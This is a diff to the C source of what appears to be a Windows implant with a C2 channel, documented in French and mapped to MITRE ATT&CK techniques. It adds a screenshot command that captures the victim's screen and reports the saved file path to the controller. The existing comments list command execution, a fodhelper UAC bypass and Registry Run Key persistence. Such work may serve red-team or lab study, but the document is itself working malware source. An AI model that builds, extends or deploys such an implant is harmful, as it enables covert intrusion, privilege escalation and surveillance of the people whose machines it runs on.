@@ -24,6 +24,7 @@
  *   ps <commande>        — exécution via PowerShell (T1059.001)
  *   elevate              — UAC bypass fodhelper auto (T1548.002)
  *   privesc <exe_path>   — UAC bypass fodhelper manuel (T1548.002)
+ *   screenshot [path]    — capture d'écran -> PNG sur la cible (T1113)
  *   persist_install      — installe la persistance Registry Run Key (T1547.001)
  *   persist_remove       — supprime la persistance
  *   persist_status       — vérifie si la persistance est active
@@ -45,6 +46,7 @@
  *   T1059.003 — Command and Scripting Interpreter: cmd.exe
  *   T1059.001 — Command and Scripting Interpreter: PowerShell
  *   T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
+ *   T1113     — Screen Capture
  *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
  *   T1573.001 — Encrypted Channel (mTLS)
  *   T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys
@@ -56,6 +58,7 @@
 #include <unistd.h> /* sleep (pour tests sur Linux) */
 #endif
 
+#include "../payloads/screenshot.h"
 #include "../payloads/shell.h"
 #include "privesc.h"
 #include "tls.h"
@@ -353,6 +356,33 @@ int main(void) {
                 int out_len = (int)strlen(msg);
                 memcpy(buf, msg, out_len);
                 buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* screenshot [path] — capture d'écran en PNG (T1113)
+             * Écrit le PNG sur la cible (rien de binaire sur le canal C2),
+             * renvoie le chemin au C2. Path optionnel : défaut %TEMP%\shot.png. */
+            if (strncmp(cmd, "screenshot", 10) == 0 &&
+                (cmd[10] == '\0' || cmd[10] == ' ')) {
+                const char *spath = (cmd[10] == ' ') ? cmd + 11 : NULL;
+                char *out = screenshot_capture(spath);
+                int out_len;
+
+                if (out != NULL) {
+                    out_len = (int)strlen(out);
+                    if (out_len > BUFFER_SIZE - 5)
+                        out_len = BUFFER_SIZE - 5;
+                    memcpy(buf, out, out_len);
+                    free(out);
+                } else {
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                                       "[screenshot] error — out of memory\r\n");
+                }
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
